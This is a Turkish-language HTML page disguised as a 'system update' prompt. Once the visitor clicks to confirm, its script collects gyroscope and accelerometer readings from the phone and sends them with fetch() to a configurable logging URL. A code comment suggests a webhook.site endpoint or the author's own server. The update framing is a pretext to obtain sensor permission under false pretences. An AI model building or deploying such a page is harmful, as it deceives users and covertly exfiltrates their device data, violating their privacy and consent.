<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sistem Durumu</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #f0f2f5;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            width: 90%;
            max-width: 400px;
        }
        h1 { font-size: 18px; color: #333; margin-bottom: 10px; }
        p { font-size: 14px; color: #666; margin-bottom: 20px; }
        .btn {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: background 0.3s;
        }
        .btn:hover { background-color: #0056b3; }
        .status { margin-top: 15px; font-size: 12px; color: #888; }
        #data-log {
            margin-top: 10px;
            font-size: 10px;
            color: #aaa;
            word-break: break-all;
            max-height: 100px;
            overflow-y: auto;
            text-align: left;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Sistem Güncellemesi</h1>
    <p>Cihaz performansı iyileştiriliyor. Devam etmek için lütfen onaylayın.</p>
    <button class="btn" id="startBtn">Devam Et</button>
    <div class="status" id="statusText">Hazır...</div>
    <div id="data-log"></div>
</div>

<script>
    // --- AYARLAR ---
    // Verileri göndereceğin URL'yi buraya yaz. 
    // Örn: 'https://webhook.site/SENIN-BENERSIN-ID' veya kendi sunucunun adresi
    const LOGGING_URL = ''; 
    
    const startBtn = document.getElementById('startBtn');
    const statusText = document.getElementById('statusText');
    const dataLog = document.getElementById('data-log');

    let isListening = false;

    // Loglama fonksiyonu
    function logData(data) {
        console.log(data);
        if(LOGGING_URL) {
            fetch(LOGGING_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).catch(e => console.error("Gönderme hatası:", e));
        }
        
        // Ekrana da yazalım (test için)
        dataLog.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${JSON.stringify(data).substring(0, 50)}...`;
        dataLog.scrollTop = dataLog.scrollHeight;
    }

    // Sensörleri başlatma
    function startSensors() {
        if (!window.DeviceOrientationEvent || !window.DeviceMotionEvent) {
            statusText.innerText = "Tarayıcınız sensörleri desteklemiyor.";
            return;
        }

        // Gyroscope (Jiroskop)
        if (window.DeviceOrientationEvent) {
            window.addEventListener('deviceorientation', (event) => {
                logData({type: 'orientation', alpha: event.alpha, beta: event.beta, gamma: event.gamma});
            });
        }

        // Accelerometer (İvmeölçer)
        if (window.DeviceMotionEvent) {
            window.addEventListener('devicemotion', (event) => {
                const acc = event.acceleration;
                const rot = event.rotationRate;
                logData({
                    type: 'motion',
                    acceleration: {x: acc?.x, y: acc?.y, z: acc?.z},
                    rotation: {alpha: rot?.alpha, beta: rot?.beta, gamma: rot?.gamma}
                });
            });
        }
        
        isListening = true;
        statusText.innerText = "Sensörler aktif. Veri toplanıyor...";
    }

    // Buton tıklaması
    startBtn.addEventListener('click', async () => {
        // iOS 13+ için izin iste
        if (typeof DeviceOrientationEvent.requestPermission === 'function') {
            try {
                const permissionState = await DeviceOrientationEvent.requestPermission();
                if (permissionState === 'granted') {
                    startSensors();
                } else {
                    alert("İzin verilmedi.");
                }
            } catch (error) {
                console.error(error);
            }
        } else {
            // Android ve eski iOS
            startSensors();
        }
    });
</script>

</body>
</html>
